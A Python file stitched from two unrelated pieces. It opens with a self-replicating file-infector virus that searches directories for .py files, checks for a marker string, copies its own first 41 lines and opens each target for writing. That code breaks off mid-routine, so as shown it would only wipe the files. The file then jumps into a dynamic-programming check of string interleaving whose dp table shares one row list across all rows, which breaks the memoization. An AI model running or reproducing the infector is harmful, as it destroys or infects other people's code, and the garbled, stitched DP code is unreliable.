#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# A Python Memoization program
# to check whether a string C is
# an interleaving of two other
# strings A and B.
 
# Declare dp array
dp = [[0]*101]*101
 
# This function checks if there exist a valid path from 0,0 to n,m
def dfs(i, j, A, B, C):
 
    # If path has already been calculated from this index
    # then return calculated value.
    if(dp[i][j]!=-1):
        return dp[i][j]
         
    # If we reach the destination return 1
    n,m=len(A),len(B)
    if(i==n and j==m):
        return 1
     
    # If C[i+j] matches with both A[i] and B[j]
    # we explore both the paths
     
    if (i<n and A[i]==C[i + j] and j<m and B[j]==C[i + j]):
        # go down and store the calculated value in x
        # and go right and store the calculated value in y.
        x = dfs(i + 1, j, A, B, C)
        y = dfs(i, j + 1, A, B, C)
         
        # return the best of both.
        dp[i][j] = x|y
        return dp[i][j]
     
    # If C[i+j] matches with A[i].
    if (i < n and A[i] == C[i + j]):
        # go down
        x = dfs(i + 1, j, A, B, C)
         
        # Return the calculated value.
        dp[i][j] = x
        return dp[i][j]
     
    # If C[i+j] matches with B[j].
    if (j < m and B[j] == C[i + j]):
        y = dfs(i, j + 1, A, B, C)
         
        # Return the calculated value.
        dp[i][j] = y
        return dp[i][j]
     
    # if nothing matches we return 0
    dp[i][j] = 0
    return dp[i][j]
 
# The main function that
# returns true if C is
# an interleaving of A
# and B, otherwise false.
def isInterleaved(A, B, C):
 
    # Storing the length in n,m
    n = len(A)
    m = len(B)
     
    # C can be an interleaving of
    # A and B only of the sum
    # of lengths of A & B is equal
    # to the length of C.
     
    if((n+m)!=len(C)):
        return 0
     
    # initializing dp array with -1
    for i in range(n+1):
        for j in range(m+1):
            dp[i][j]=-1
     
    # calling and returning the answer
    return dfs(0,0,A,B,C)
     
 
# A function to run test cases
def test(A, B, C):
 
    if (isInterleaved(A, B, C)):
        print(C, "is interleaved of", A, "and", B)
    else:
        print(C, "is not interleaved of", A, "and", B)
 
# Driver Code
if __name__ == '__main__':
    test("XXY", "XXZ", "XXZXXXY")
    test("XY", "WZ", "WZXY")
    test("XY", "X", "XXY")
    test("YX", "X", "XXY")
    test("XXY", "XXZ", "XXXXZY")
    test("ACA", "DAS", "DAACSA")
     
# This code is contributed by Pushpesh Raj.
# Time Complexity: O(m*n)
# Space Complexity: O(m*n)